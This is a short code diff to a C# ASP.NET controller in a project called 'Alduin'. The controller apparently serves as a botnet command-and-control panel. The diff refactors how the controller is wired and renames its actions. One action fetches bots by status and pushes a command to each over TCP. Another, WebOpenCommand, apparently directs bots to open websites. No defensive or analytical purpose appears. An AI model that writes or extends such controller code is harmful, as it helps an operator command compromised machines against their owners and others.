@@ -9,7 +9,6 @@ using Microsoft.AspNetCore.Identity;
 using Microsoft.AspNetCore.Mvc;
 using Alduin.Server.Handler;
 using MediatR;
-using Alduin.Server.Interfaces;
 using Alduin.Logic.Mediator.Queries;
 using Alduin.Shared.DTOs;
 
@@ -18,7 +17,13 @@ namespace Alduin.Web.Controllers
     public class CommandsController : ControllerBase
     {
         private readonly IMediator _mediator;
-        private readonly ICommand _commandexecute;
+
+
+        public CommandsController(IMediator mediator)
+        {
+            _mediator = mediator;
+        }
+
         [Authorize]
         public IActionResult Index()
         {
@@ -38,7 +43,7 @@ namespace Alduin.Web.Controllers
         }
         [Authorize]
         [HttpPost]
-        public IActionResult SetCommand(ExecuteModel model)
+        public async Task<IActionResult> ExecuteCommand(ExecuteModel model)
         {
             if (!ModelState.IsValid)
                 return View(model);
@@ -53,13 +58,13 @@ namespace Alduin.Web.Controllers
             var bots = new GetBotsByStatusQuery { 
                 status = model.Force
             };
-            var botlist = _mediator.Send(bots);
-            _commandexecute.Send(botlist, command);
+            var botlist = await _mediator.Send(bots);
+            CommandExecute.TcpConnects(botlist, command);
             return Json(true);
         }
         [Authorize]
         [HttpPost]
-        public IActionResult SetCommand(WebsiteModel model)
+        public IActionResult WebOpenCommand(WebsiteModel model)
         {
             if (!ModelState.IsValid)
                 return View(model);
